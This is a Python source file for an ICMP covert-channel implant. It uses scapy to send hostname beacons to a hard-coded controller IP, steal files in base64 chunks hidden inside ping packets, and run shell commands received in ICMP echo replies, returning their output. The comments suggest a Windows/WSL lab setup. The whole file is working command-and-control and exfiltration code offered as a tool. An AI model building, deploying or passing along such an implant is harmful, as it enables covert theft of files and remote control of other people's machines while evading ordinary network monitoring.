import sys
import time
import base64
import os
import subprocess
import threading
from scapy.all import sniff, send, IP, ICMP

CONTROLLER_IP = "172.23.30.36"  # Your Windows machine's actual IP (not 127.0.0.1)
MAGIC_BYTES = "EXFIL"
BEACON_INTERVAL = 30
ID = str(time.time())

import platform

# Add Npcap to PATH for Windows
if os.name == 'nt':
    os.environ['PATH'] += os.pathsep + r"C:\\Windows\\System32\\Npcap"

from scapy.config import conf
# conf.use_pcap = False

def send_icmp(msg_type, data):
    payload = f"{MAGIC_BYTES}{msg_type}".encode() + data
    pkt = IP(dst=CONTROLLER_IP)/ICMP(type=8, id=1000)/payload
    print(f"[DEBUG] Sending ICMP to {CONTROLLER_IP}, type={msg_type}, payload_len={len(payload)}")
    send(pkt, verbose=0)
    print(f"[DEBUG] Packet sent")

def beacon():
    while True:
        info = f"{platform.node()}|{platform.system()}"
        encoded = base64.b64encode(info.encode())
        send_icmp('B', encoded)
        time.sleep(BEACON_INTERVAL)

def exfiltrate(filepath):
    try:
        with open(filepath, 'rb') as f:
            content = f.read()
            encoded = base64.b64encode(content)
            
            # Chunking
            chunk_size = 1000
            total_chunks = (len(encoded) + chunk_size - 1) // chunk_size
            file_id = str(int(time.time()))
            
            print(f"[*] Exfiltrating {filepath}...")
            
            for i in range(total_chunks):
                chunk = encoded[i*chunk_size : (i+1)*chunk_size]
                # FILE_ID|CHUNK_NUM|TOTAL_CHUNKS|FILENAME|CONTENT
                payload = f"{file_id}|{i+1}|{total_chunks}|{os.path.basename(filepath)}|".encode() + chunk
                send_icmp('D', payload)
                time.sleep(0.1)
            
            print("[+] Done")
    except Exception as e:
        print(f"[-] Error: {e}")

def handle_packet(pkt):
    print(f"[DEBUG] Received packet: {pkt.summary()}")
    if ICMP in pkt:
        print(f"[DEBUG] ICMP packet - type={pkt[ICMP].type}, src={pkt[IP].src}")
        if pkt[ICMP].type == 0 and pkt[IP].src == CONTROLLER_IP:
            payload = bytes(pkt[ICMP].payload)
            print(f"[DEBUG] ICMP Echo Reply from controller, payload length: {len(payload)}")
            if MAGIC_BYTES.encode() in payload:
                print(f"[DEBUG] Magic bytes found!")
                try:
                    # MAGIC|C|CMD_B64
                    content = payload.split(MAGIC_BYTES.encode())[1]
                    msg_type = chr(content[0])
                    print(f"[DEBUG] Message type: {msg_type}")
                    if msg_type == 'C':
                        cmd_b64 = content[1:]
                        cmd = base64.b64decode(cmd_b64).decode().strip()
                        print(f"[*] Executing: {cmd}")
                        
                        # Command Translation / Handling
                        output = ""
                        parts = cmd.split()
                        base_cmd = parts[0].lower() if parts else ""
                        
                        if base_cmd == 'cd':
                            try:
                                target_dir = " ".join(parts[1:]) if len(parts) > 1 else os.path.expanduser("~")
                                os.chdir(target_dir)
                                output = f"Changed directory to {os.getcwd()}"
                            except Exception as e:
                                output = str(e)
                        elif base_cmd == 'pwd':
                            output = os.getcwd()
                        elif base_cmd == 'ls' and os.name == 'nt':
                            # Simulate ls on Windows
                            try:
                                output = "\n".join(os.listdir('.'))
                            except Exception as e:
                                output = str(e)
                        elif base_cmd == 'cat' and os.name == 'nt':
                             # Convert cat to type
                             cmd = 'type ' + " ".join(parts[1:])
                             output = subprocess.getoutput(cmd)
                        else:
                            # Standard execution
                            output = subprocess.getoutput(cmd)
                            
                        print(f"[DEBUG] Command output: {output[:100]}")
                        send_icmp('R', base64.b64encode(output.encode()))
                        print(f"[DEBUG] Response sent!")
                except Exception as e:
                    print(f"[-] Error processing command: {e}")
                    import traceback
                    traceback.print_exc()
            else:
                print(f"[DEBUG] No magic bytes in payload")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        exfiltrate(sys.argv[1])
    else:
        # Start command listener
        t = threading.Thread(target=beacon)
        t.daemon = True
        t.start()
        
        # Auto-detect correct interface for WSL communication
        from scapy.all import get_if_list, get_if_addr
        
        target_iface = None
        controller_subnet = ".".join(CONTROLLER_IP.split(".")[:2]) # e.g. "172.23"
        
        print("[*] Detecting correct interface...")
        for iface in get_if_list():
             try:
                 addr = get_if_addr(iface)
                 if addr and addr.startswith(controller_subnet):
                     print(f"[+] Found WSL Interface: {iface} ({addr})")
                     target_iface = iface
                     conf.iface = iface # Set globally
                     break
             except:
                 pass
        
        if not target_iface:
            print(f"[-] Could not look up interface for subnet {controller_subnet}. Using default.")
        
        print(f"[*] Sniffing on interface: {conf.iface}")
        print("[*] Listening for commands...")
        
        # Sniff on the specific interface
        sniff(iface=target_iface, filter="icmp", prn=handle_packet, store=0)
